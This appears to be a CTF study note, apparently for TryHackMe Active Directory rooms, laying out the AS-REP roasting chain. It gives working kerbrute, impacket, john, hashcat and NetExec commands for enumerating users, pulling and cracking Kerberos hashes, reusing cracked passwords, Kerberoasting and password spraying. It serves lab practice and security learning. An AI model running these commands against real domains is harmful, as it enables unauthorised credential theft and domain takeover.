# AD AS-REP Roasting Chain

Use when AD is present and you have usernames but no valid password yet. This appears in TryHackMe AD-style rooms where SMB/RID/OSINT gives a user list and one account has Kerberos pre-authentication disabled.

## Signals

- Kerberos `88` is open.
- You have usernames from RID brute, LDAP, SMB files, web leaks, or naming convention.
- No initial credential works yet.

## Main Path

```bash
kerbrute userenum users.txt --dc target -d domain.local
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip target -outputfile asrep.hashes
john asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

After cracking:

```bash
nxc smb target -u cracked_user -p 'cracked_pass' --shares
nxc winrm target -u cracked_user -p 'cracked_pass'
impacket-GetUserSPNs domain.local/cracked_user:'cracked_pass' -dc-ip target -request
```

## Options To Try

- If no AS-REP hashes return, try password spray with likely passwords from room names, company names, discovered files, seasons, or default patterns.
- If you have readable SMB, gather `NETLOGON`, `SYSVOL`, scripts, and user docs before spraying.
- If cracking fails, try rules with `hashcat -r`, `john --single`, or build a room-specific wordlist with `cewl`.
- If creds work only on SMB, search shares for second-stage credentials.
- If WinRM is blocked, test RDP, SMB exec, MSSQL, LDAP, and Kerberoasting.

## Study Examples

- Cajac VulnNet Roasted: RID brute -> AS-REP hash -> crack -> SMB `NETLOGON` credential leak -> WinRM -> DCSync.
- Cajac Attacktive Directory: Kerberos user enumeration and AS-REP path before domain escalation.
